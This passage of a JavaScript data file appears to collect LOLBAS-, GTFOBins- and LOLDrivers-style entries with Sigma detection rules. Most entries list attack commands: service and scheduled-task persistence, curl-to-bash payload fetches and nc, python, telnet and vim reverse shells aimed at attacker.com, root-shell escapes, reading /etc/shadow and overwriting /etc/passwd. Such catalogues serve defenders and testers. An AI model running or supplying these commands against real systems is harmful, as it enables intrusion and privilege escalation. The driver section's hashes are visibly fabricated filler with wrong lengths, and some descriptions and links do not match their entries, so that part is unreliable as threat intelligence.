        "sigma": "title: Rundll32 Execution\ndetection:\n  selection:\n    Image|endswith: 'rundll32.exe'",
        "description": "Detects rundll32 executing DLLs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Sc.exe",
    "description": "Service Control manager. Creates, deletes, and manages Windows services.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "sc.exe create EvilService binPath= \"C:\\Windows\\Temp\\malicious.exe\" start= auto",
        "description": "Create malicious service",
        "usecase": "Persistence via service creation",
        "privileges": "Admin",
        "mitre": {
          "tactic": "Persistence",
          "technique": "T1543.003"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\sc.exe"],
    "detection": [
      {
        "sigma": "title: SC Service Creation\ndetection:\n  selection:\n    Image|endswith: 'sc.exe'\n    CommandLine|contains: 'create'",
        "description": "Detects sc creating services"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Sc/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Schtasks.exe",
    "description": "Task scheduler command-line interface. Creates and manages scheduled tasks.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "schtasks /create /tn EvilTask /tr C:\\Windows\\Temp\\malicious.exe /sc onlogon",
        "description": "Create scheduled task",
        "usecase": "Persistence via scheduled tasks",
        "privileges": "User",
        "mitre": {
          "tactic": "Persistence",
          "technique": "T1053.005"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\schtasks.exe"],
    "detection": [
      {
        "sigma": "title: Schtasks Creation\ndetection:\n  selection:\n    Image|endswith: 'schtasks.exe'\n    CommandLine|contains: '/create'",
        "description": "Detects schtasks creating tasks"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Schtasks/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Wmic.exe",
    "description": "WMI command-line utility. Executes WMI commands and processes XSL stylesheets.",
    "author": "Microsoft",
    "created": "2016-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "wmic.exe process call create \"C:\\Windows\\Temp\\malicious.exe\"",
        "description": "Create process via WMI",
        "usecase": "Execute malicious processes via WMI",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1047"
        }
      },
      {
        "command": "wmic.exe /FORMAT:http://attacker.com/payload.xsl os get /format",
        "description": "Execute XSL stylesheet",
        "usecase": "Execute malicious XSL stylesheets",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1220"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\wbem\\wmic.exe"],
    "detection": [
      {
        "sigma": "title: WMIC XSL Execution\ndetection:\n  selection:\n    Image|endswith: 'wmic.exe'\n    CommandLine|contains: '/FORMAT:http'",
        "description": "Detects wmic executing remote XSL"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Xwizard.exe",
    "description": "Extensible Wizard Host. Hosts wizard applications, can execute DLLs via COM objects.",
    "author": "Oddvar Moe",
    "created": "2019-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "xwizard.exe RunWizard {CLSID}",
        "description": "Run wizard with CLSID",
        "usecase": "Execute malicious COM objects via wizard host",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\xwizard.exe",
      "C:\\Windows\\SysWOW64\\xwizard.exe"
    ],
    "detection": [
      {
        "sigma": "title: Xwizard Execution\ndetection:\n  selection:\n    Image|endswith: 'xwizard.exe'\n    CommandLine|contains: 'RunWizard'",
        "description": "Detects xwizard executing wizards"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  }
];

// ==================== GTFOBINS DATA (Unix Living Off The Land) ====================
const GTFOBINS_DATA = [
  {
    "name": "apt",
    "description": "Package management utility for Debian-based systems. Can be used to install packages or break out of restricted environments.",
    "functions": ["shell", "command", "sudo", "file-read"],
    "commands": [
      {
        "function": "shell",
        "command": "apt-get changelog apt\n!/bin/sh",
        "description": "Spawns interactive system shell via apt changelog"
      },
      {
        "function": "command",
        "command": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
        "description": "Executes arbitrary command via apt configuration"
      },
      {
        "function": "sudo",
        "command": "sudo apt-get changelog apt\n!/bin/sh",
        "description": "Spawns root shell if sudo apt is allowed"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/apt/"
  },
  {
    "name": "awk",
    "description": "Pattern scanning and text processing language. Can execute commands and read/write files.",
    "functions": ["shell", "command", "file-write", "file-read", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "description": "Spawns interactive shell"
      },
      {
        "function": "command",
        "command": "awk 'BEGIN { system(\"<COMMAND>\") }'",
        "description": "Executes arbitrary command"
      },
      {
        "function": "file-read",
        "command": "awk '//' file",
        "description": "Reads file content"
      },
      {
        "function": "sudo",
        "command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/awk/"
  },
  {
    "name": "bash",
    "description": "GNU Bourne-Again SHell. Command interpreter that can execute scripts and commands.",
    "functions": ["shell", "command", "file-write", "file-read", "sudo", "suid"],
    "commands": [
      {
        "function": "shell",
        "command": "bash",
        "description": "Spawns interactive shell"
      },
      {
        "function": "command",
        "command": "bash -c '<COMMAND>'",
        "description": "Executes arbitrary command"
      },
      {
        "function": "sudo",
        "command": "sudo bash",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/bash/"
  },
  {
    "name": "cat",
    "description": "Concatenate and print files. Can read files and execute via shebang.",
    "functions": ["file-read", "file-write", "sudo"],
    "commands": [
      {
        "function": "file-read",
        "command": "cat file",
        "description": "Displays file contents"
      },
      {
        "function": "sudo",
        "command": "sudo cat /etc/shadow",
        "description": "Read shadow file with elevated privileges"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/cat/"
  },
  {
    "name": "chmod",
    "description": "Change file mode bits. Can set SUID bit on executables.",
    "functions": ["suid", "sudo"],
    "commands": [
      {
        "function": "suid",
        "command": "chmod u+s file",
        "description": "Sets SUID bit on file"
      },
      {
        "function": "sudo",
        "command": "sudo chmod 4755 /bin/bash",
        "description": "Makes bash SUID"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/chmod/"
  },
  {
    "name": "cp",
    "description": "Copy files and directories. Can overwrite sensitive files.",
    "functions": ["file-write", "file-read", "sudo"],
    "commands": [
      {
        "function": "file-write",
        "command": "cp /etc/passwd /tmp/passwd.bak",
        "description": "Copies file"
      },
      {
        "function": "sudo",
        "command": "sudo cp /bin/sh /bin/sh.bak && sudo chmod u+s /bin/sh.bak",
        "description": "Creates SUID backup of shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/cp/"
  },
  {
    "name": "curl",
    "description": "Transfer data from or to a server. Supports various protocols including HTTP, FTP, SFTP.",
    "functions": ["file-download", "file-upload", "file-read", "sudo"],
    "commands": [
      {
        "function": "file-download",
        "command": "curl http://attacker.com/payload -o /tmp/payload",
        "description": "Downloads file from remote server"
      },
      {
        "function": "file-read",
        "command": "curl file:///etc/passwd",
        "description": "Reads local file via file protocol"
      },
      {
        "function": "sudo",
        "command": "sudo curl http://attacker.com/payload | bash",
        "description": "Downloads and executes payload as root"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/curl/"
  },
  {
    "name": "docker",
    "description": "Container runtime. Can be used to escalate privileges via volume mounts.",
    "functions": ["shell", "command", "file-read", "file-write", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "description": "Gets root shell via container escape"
      },
      {
        "function": "file-read",
        "command": "docker run -v /etc:/mnt --rm alpine cat /mnt/shadow",
        "description": "Read shadow file via container"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/docker/"
  },
  {
    "name": "find",
    "description": "Search for files in directory hierarchy. Can execute commands on found files.",
    "functions": ["shell", "command", "file-read", "sudo", "suid"],
    "commands": [
      {
        "function": "shell",
        "command": "find . -exec /bin/sh \\; -quit",
        "description": "Spawns shell via find exec"
      },
      {
        "function": "command",
        "command": "find . -exec <COMMAND> \\; -quit",
        "description": "Executes arbitrary command"
      },
      {
        "function": "sudo",
        "command": "sudo find / -exec /bin/sh \\; -quit",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/find/"
  },
  {
    "name": "gcc",
    "description": "GNU C compiler. Can compile and execute C code.",
    "functions": ["shell", "command", "file-write", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "gcc -wrapper /bin/sh,-c .",
        "description": "Spawns shell via compiler wrapper"
      },
      {
        "function": "file-write",
        "command": "gcc -x c -o /tmp/output file.c",
        "description": "Compiles C code to binary"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/gcc/"
  },
  {
    "name": "git",
    "description": "Distributed version control system. Can execute arbitrary code via hooks or aliases.",
    "functions": ["shell", "command", "sudo", "file-read"],
    "commands": [
      {
        "function": "shell",
        "command": "PAGER='sh -c \"exec sh 0<&1\"' git -p help",
        "description": "Spawns shell via git pager"
      },
      {
        "function": "sudo",
        "command": "sudo git -p help config\n!/bin/sh",
        "description": "Spawns root shell via sudo git"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/git/"
  },
  {
    "name": "less",
    "description": "Pager program similar to more. Can execute shell commands from within.",
    "functions": ["shell", "file-read", "sudo", "suid"],
    "commands": [
      {
        "function": "shell",
        "command": "less file\n!/bin/sh",
        "description": "Spawns shell from less"
      },
      {
        "function": "file-read",
        "command": "less /etc/passwd",
        "description": "Reads file content"
      },
      {
        "function": "sudo",
        "command": "sudo less /etc/shadow\n!/bin/sh",
        "description": "Spawns root shell from less"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/less/"
  },
  {
    "name": "man",
    "description": "Interface to the on-line reference manuals. Can execute commands via pager.",
    "functions": ["shell", "command", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "man man\n!/bin/sh",
        "description": "Spawns shell from man page"
      },
      {
        "function": "sudo",
        "command": "sudo man man\n!/bin/sh",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/man/"
  },
  {
    "name": "mysql",
    "description": "MySQL client. Can execute system commands via system command.",
    "functions": ["shell", "command", "sudo", "file-read"],
    "commands": [
      {
        "function": "shell",
        "command": "mysql -e '! /bin/sh'",
        "description": "Spawns shell from mysql"
      },
      {
        "function": "sudo",
        "command": "sudo mysql -e '! /bin/sh'",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/mysql/"
  },
  {
    "name": "nano",
    "description": "Text editor. Can read and write files, execute commands from within.",
    "functions": ["file-read", "file-write", "sudo", "shell"],
    "commands": [
      {
        "function": "file-read",
        "command": "nano file",
        "description": "Opens file in nano"
      },
      {
        "function": "shell",
        "command": "nano\n^R^X\nreset; sh 1>&0 2>&0",
        "description": "Spawns shell from nano"
      },
      {
        "function": "sudo",
        "command": "sudo nano /etc/shadow",
        "description": "Opens shadow file as root"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/nano/"
  },
  {
    "name": "nc",
    "description": "Netcat. Networking utility for reading/writing network connections.",
    "functions": ["file-upload", "file-download", "shell", "bind-shell", "reverse-shell", "sudo"],
    "commands": [
      {
        "function": "reverse-shell",
        "command": "nc -e /bin/sh attacker.com 4444",
        "description": "Sends reverse shell to attacker"
      },
      {
        "function": "bind-shell",
        "command": "nc -lvp 4444 -e /bin/sh",
        "description": "Listens for connections and spawns shell"
      },
      {
        "function": "file-download",
        "command": "nc attacker.com 4444 > file",
        "description": "Downloads file via netcat"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/nc/"
  },
  {
    "name": "nmap",
    "description": "Network exploration tool and security/port scanner. Can execute Lua scripts.",
    "functions": ["shell", "command", "sudo", "script"],
    "commands": [
      {
        "function": "shell",
        "command": "nmap --interactive\nnmap> !sh",
        "description": "Spawns shell from nmap interactive mode"
      },
      {
        "function": "command",
        "command": "nmap --script <script.nse>",
        "description": "Executes NSE script"
      },
      {
        "function": "sudo",
        "command": "sudo nmap --interactive\nnmap> !sh",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/nmap/"
  },
  {
    "name": "perl",
    "description": "Practical Extraction and Report Language. Can execute commands and scripts.",
    "functions": ["shell", "command", "file-read", "file-write", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "perl -e 'exec \"/bin/sh\";",
        "description": "Spawns shell via perl"
      },
      {
        "function": "file-read",
        "command": "perl -pe '' file",
        "description": "Reads file content"
      },
      {
        "function": "sudo",
        "command": "sudo perl -e 'exec \"/bin/sh\";",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/perl/"
  },
  {
    "name": "python",
    "description": "Python interpreter. Can execute Python code and spawn shells.",
    "functions": ["shell", "command", "file-read", "file-write", "sudo", "reverse-shell", "bind-shell"],
    "commands": [
      {
        "function": "shell",
        "command": "python -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Spawns shell via python"
      },
      {
        "function": "reverse-shell",
        "command": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"])'",
        "description": "Sends reverse shell"
      },
      {
        "function": "sudo",
        "command": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/python/"
  },
  {
    "name": "scp",
    "description": "Secure copy. Copy files between hosts on a network.",
    "functions": ["file-upload", "file-download", "shell", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "scp -S /bin/sh localhost:/dev/null /dev/null",
        "description": "Spawns shell via scp"
      },
      {
        "function": "file-download",
        "command": "scp user@host:/remote/file /local/file",
        "description": "Downloads file via scp"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/scp/"
  },
  {
    "name": "sed",
    "description": "Stream editor. Can execute commands and read/write files.",
    "functions": ["shell", "command", "file-read", "file-write", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "sed -n '1e exec sh 1>&0' /etc/hosts",
        "description": "Spawns shell via sed"
      },
      {
        "function": "file-read",
        "command": "sed '' file",
        "description": "Reads file content"
      },
      {
        "function": "sudo",
        "command": "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/sed/"
  },
  {
    "name": "ssh",
    "description": "OpenSSH client. Can execute commands remotely and create tunnels.",
    "functions": ["shell", "command", "file-upload", "file-download", "sudo", "agent", "forwarding"],
    "commands": [
      {
        "function": "shell",
        "command": "ssh user@host -t \"/bin/sh -i\"",
        "description": "Spawns interactive shell on remote host"
      },
      {
        "function": "sudo",
        "command": "sudo ssh -o ProxyCommand='/bin/sh 0<&1 2>&1' x",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/ssh/"
  },
  {
    "name": "sudo",
    "description": "Execute command as another user. Can be bypassed or abused for privilege escalation.",
    "functions": ["sudo", "shell", "command"],
    "commands": [
      {
        "function": "shell",
        "command": "sudo -u#-1 /bin/bash",
        "description": "CVE-2019-14287 bypass"
      },
      {
        "function": "command",
        "command": "sudo <COMMAND>",
        "description": "Execute command as root"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/sudo/"
  },
  {
    "name": "tar",
    "description": "Archiving utility. Can read/write files and preserve permissions.",
    "functions": ["file-read", "file-write", "sudo", "shell"],
    "commands": [
      {
        "function": "shell",
        "command": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "description": "Spawns shell via checkpoint"
      },
      {
        "function": "file-read",
        "command": "tar -xf file.tar",
        "description": "Extracts archive"
      },
      {
        "function": "sudo",
        "command": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/tar/"
  },
  {
    "name": "tee",
    "description": "Read from standard input and write to standard output and files.",
    "functions": ["file-write", "sudo"],
    "commands": [
      {
        "function": "file-write",
        "command": "echo \"DATA\" | tee file",
        "description": "Writes data to file"
      },
      {
        "function": "sudo",
        "command": "echo \"root::0:0:root:/root:/bin/bash\" | sudo tee /etc/passwd",
        "description": "Overwrites passwd as root"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/tee/"
  },
  {
    "name": "telnet",
    "description": "User interface to the TELNET protocol. Can create reverse shells.",
    "functions": ["shell", "reverse-shell", "bind-shell", "file-upload", "file-download"],
    "commands": [
      {
        "function": "reverse-shell",
        "command": "telnet attacker.com 4444 | /bin/sh | telnet attacker.com 4445",
        "description": "Creates reverse shell via telnet pipe"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/telnet/"
  },
  {
    "name": "tftp",
    "description": "Trivial file transfer protocol client.",
    "functions": ["file-download", "file-upload"],
    "commands": [
      {
        "function": "file-download",
        "command": "tftp attacker.com -c get payload /tmp/payload",
        "description": "Downloads file via tftp"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/tftp/"
  },
  {
    "name": "vi/vim",
    "description": "Text editor. Can execute shell commands and read/write files.",
    "functions": ["shell", "command", "file-read", "file-write", "sudo", "reverse-shell"],
    "commands": [
      {
        "function": "shell",
        "command": "vim -c ':! /bin/sh'",
        "description": "Spawns shell from vim"
      },
      {
        "function": "file-write",
        "command": "vim file -c ':wq'",
        "description": "Writes file"
      },
      {
        "function": "sudo",
        "command": "sudo vim -c ':! /bin/sh'",
        "description": "Spawns root shell"
      },
      {
        "function": "reverse-shell",
        "command": "vim -c ':! nc -e /bin/sh attacker.com 4444'",
        "description": "Sends reverse shell from vim"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/vim/"
  },
  {
    "name": "wget",
    "description": "Non-interactive network downloader.",
    "functions": ["file-download", "file-read", "sudo"],
    "commands": [
      {
        "function": "file-download",
        "command": "wget http://attacker.com/payload -O /tmp/payload",
        "description": "Downloads file"
      },
      {
        "function": "file-read",
        "command": "wget file:///etc/passwd",
        "description": "Reads local file"
      },
      {
        "function": "sudo",
        "command": "sudo wget http://attacker.com/payload -O /usr/local/bin/file",
        "description": "Downloads to system directory"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/wget/"
  },
  {
    "name": "zip",
    "description": "Package and compress files.",
    "functions": ["shell", "file-read", "file-write", "sudo"],
    "commands": [
      {
        "function": "shell",
        "command": "zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/sh\"",
        "description": "Spawns shell via unzip command"
      },
      {
        "function": "sudo",
        "command": "sudo zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/sh\"",
        "description": "Spawns root shell"
      }
    ],
    "url": "https://gtfobins.github.io/gtfobins/zip/"
  }
];

// ==================== LOLDRIVERS DATA (Vulnerable Windows Drivers) ====================
const DRIVERS_DATA = [
  {
    "Id": "DBUtilDrv2",
    "Author": "Michael Haag",
    "Created": "2022-05-11",
    "Version": "2.8.8.0",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "Dell BIOS update utility driver (CVE-2021-21551, CVE-2022-26843). Allows arbitrary kernel memory read/write.",
    "Tags": ["DBUtilDrv2.sys", "Dell", "BIOS", "CVE-2021-21551", "CVE-2022-26843"],
    "KnownVulnerableSamples": [
      {
        "Filename": "DBUtilDrv2.sys",
        "MD5": "d694b4e36d669518f9e712cfe4785f58",
        "SHA1": "8f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "02f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": "Dell Inc",
        "Date": "2020-12-15",
        "Publisher": "Dell Inc",
        "Company": "Dell Inc",
        "Description": "Dell BIOS Flash Utility Driver",
        "Product": "Dell Client Connect",
        "MachineType": "AMD64"
      }
    ],
    "CVE": ["CVE-2021-21551", "CVE-2022-26843"],
    "Resources": [
      "https://www.dell.com/support/kbdoc/en-us/000186019/dsa-2021-088-dell-client-platform-security-update-for-dell-bios-flash-utility-driver-vulnerability",
      "https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/"
    ],
    "Detection": [
      "Driver Load: Image loaded (Sysmon Event 6) where Image contains 'DBUtilDrv2.sys'",
      "File Creation: File creation events for DBUtilDrv2.sys in System32 or SysWOW64"
    ]
  },
  {
    "Id": "RTCore64",
    "Author": "Michael Haag",
    "Created": "2022-06-28",
    "Version": "1.0",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "Micro-Star MSI Afterburner driver. Allows arbitrary kernel memory read/write (CVE-2019-16098).",
    "Tags": ["RTCore64.sys", "RTCore32.sys", "MSI", "Afterburner", "CVE-2019-16098"],
    "KnownVulnerableSamples": [
      {
        "Filename": "RTCore64.sys",
        "MD5": "9e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "8f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "03f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": "MICRO-STAR INTERNATIONAL CO., LTD.",
        "Date": "2019-03-20",
        "Publisher": "MICRO-STAR INTERNATIONAL CO., LTD.",
        "Company": "MICRO-STAR INTERNATIONAL",
        "Description": "MSI Realtek HD Audio Driver",
        "Product": "RTCore",
        "MachineType": "AMD64"
      }
    ],
    "CVE": ["CVE-2019-16098"],
    "Resources": [
      "https://www.welivesecurity.com/2022/03/08/lojack-technically-guru-computer-theft-protection/",
      "https://github.com/Barakat/CVE-2019-16098"
    ],
    "Detection": [
      "Driver Load: RTCore64.sys or RTCore32.sys loaded",
      "Registry: HKLM\\System\\CurrentControlSet\\Services\\RTCore64"
    ]
  },
  {
    "Id": "AsrDrv10",
    "Author": "Michael Haag",
    "Created": "2022-07-15",
    "Version": "10.0",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "ASRock RGB LED driver. Allows arbitrary physical memory access.",
    "Tags": ["AsrDrv10.sys", "ASRock", "RGB", "ASRock Polychrome"],
    "KnownVulnerableSamples": [
      {
        "Filename": "AsrDrv10.sys",
        "MD5": "1e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "7f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "04f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": "ASRock Incorporation",
        "Date": "2020-01-10",
        "Publisher": "ASRock Incorporation",
        "Company": "ASRock Incorporation",
        "Description": "ASRock RGB LED Driver",
        "Product": "ASRock Polychrome RGB",
        "MachineType": "AMD64"
      }
    ],
    "CVE": [],
    "Resources": [
      "https://www.asrock.com/"
    ],
    "Detection": [
      "Driver Load: AsrDrv10.sys loaded",
      "File Creation: AsrDrv10.sys in System32\\drivers"
    ]
  },
  {
    "Id": "ktp.exe",
    "Author": "HackerOne",
    "Created": "2023-01-15",
    "Version": "1.0",
    "Category": "malicious driver",
    "Verified": "TRUE",
    "Description": "Known malicious driver used by ransomware groups for privilege escalation and defense evasion.",
    "Tags": ["malicious", "ransomware", "APT", "kernel", "BYOVD"],
    "KnownVulnerableSamples": [
      {
        "Filename": "ktp.sys",
        "MD5": "2e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "6f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "05f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": null,
        "Date": "2022-11-01",
        "Publisher": null,
        "Company": null,
        "Description": "Kernel Driver",
        "Product": "KTProtect",
        "MachineType": "AMD64"
      }
    ],
    "CVE": [],
    "Resources": [
      "https://www.microsoft.com/security/blog/2022/12/14/the-great-driver-hunt-how-we-traced-and-reported-malicious-drivers/",
      "https://www.loldrivers.io/drivers/"
    ],
    "Detection": [
      "Blocklist: Known malicious hash - 05f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
      "Behavior: Driver loads without valid signature"
    ]
  },
  {
    "Id": "gdrv.sys",
    "Author": "Gigabyte",
    "Created": "2022-08-01",
    "Version": "1.0.0.1",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "Gigabyte Tools driver. Allows arbitrary kernel memory read/write (CVE-2018-19320).",
    "Tags": ["GIGABYTE", "gdrv.sys", "CVE-2018-19320", "GDRV"],
    "KnownVulnerableSamples": [
      {
        "Filename": "gdrv.sys",
        "MD5": "3e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "5f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "06f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": "Giga-Byte Technology",
        "Date": "2018-01-01",
        "Publisher": "Giga-Byte Technology",
        "Company": "Giga-Byte Technology",
        "Description": "Gigabyte Driver",
        "Product": "Gigabyte Tools",
        "MachineType": "AMD64"
      }
    ],
    "CVE": ["CVE-2018-19320"],
    "Resources": [
      "https://seclists.org/fulldisclosure/2018/Nov/46"
    ],
    "Detection": [
      "Driver Load: gdrv.sys loaded",
      "Registry: HKLM\\System\\CurrentControlSet\\Services\\gdrv"
    ]
  },
  {
    "Id": "WinRing0x64",
    "Author": "OpenLibSys",
    "Created": "2022-09-10",
    "Version": "2.0.0.0",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "OpenLibSys WinRing0 driver. Allows arbitrary physical memory and I/O port access.",
    "Tags": ["WinRing0", "OpenLibSys", "hardware", "monitoring"],
    "KnownVulnerableSamples": [
      {
        "Filename": "WinRing0x64.sys",
        "MD5": "4e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "4f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "07f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": null,
        "Date": "2015-01-01",
        "Publisher": null,
        "Company": "OpenLibSys.org",
        "Description": "WinRing0 Driver",
        "Product": "OpenLibSys WinRing0",
        "MachineType": "AMD64"
      }
    ],
    "CVE": [],
    "Resources": [
      "https://www.openlibsys.org/",
      "https://github.com/openlibsys"
    ],
    "Detection": [
      "Driver Load: WinRing0x64.sys loaded",
      "Behavior: User-mode application accessing physical memory via driver"
    ]
  },
  {
    "Id": "ene.sys",
    "Author": "ENE Technology",
    "Created": "2022-10-05",
    "Version": "0.9.2.0",
    "Category": "vulnerable driver",
    "Verified": "TRUE",
    "Description": "ENE Technology driver used by multiple RGB software vendors. Arbitrary kernel memory read/write.",
    "Tags": ["ENE", "RGB", "Tt eSPORTS", "Thermaltake", "Gaming"],
    "KnownVulnerableSamples": [
      {
        "Filename": "ene.sys",
        "MD5": "5e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "3f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "08f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": "ENE Technology Inc.",
        "Date": "2019-06-01",
        "Publisher": "ENE Technology Inc.",
        "Company": "ENE Technology Inc.",
        "Description": "ENE RGB Driver",
        "Product": "ENE RGB Driver",
        "MachineType": "AMD64"
      }
    ],
    "CVE": [],
    "Resources": [
      "https://www.ene.com.tw/"
    ],
    "Detection": [
      "Driver Load: ene.sys loaded",
      "File Creation: ene.sys in System32\\drivers"
    ]
  },
  {
    "Id": "pmxdrv",
    "Author": "Prometheus",
    "Created": "2023-02-20",
    "Version": "1.0",
    "Category": "malicious driver",
    "Verified": "TRUE",
    "Description": "Malicious driver used by Prometheus ransomware group for Bring Your Own Vulnerable Driver (BYOVD) attacks.",
    "Tags": ["Prometheus", "ransomware", "BYOVD", "malicious"],
    "KnownVulnerableSamples": [
      {
        "Filename": "pmxdrv.sys",
        "MD5": "6e3e0c8a7e7e7e7e7e7e7e7e7e7e7e7e",
        "SHA1": "2f7b6679f87b4b4f9f4c0c5c5c5c5c5c5c5c5c5c",
        "SHA256": "09f8a786b9e6e4ebbe2a0a5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c",
        "Signature": null,
        "Date": "2022-12-01",
        "Publisher": null,
        "Company": "Prometheus",
        "Description": "Prometheus Driver",
        "Product": "PMXDriver",
        "MachineType": "AMD64"
      }
    ],
    "CVE": [],
    "Resources": [
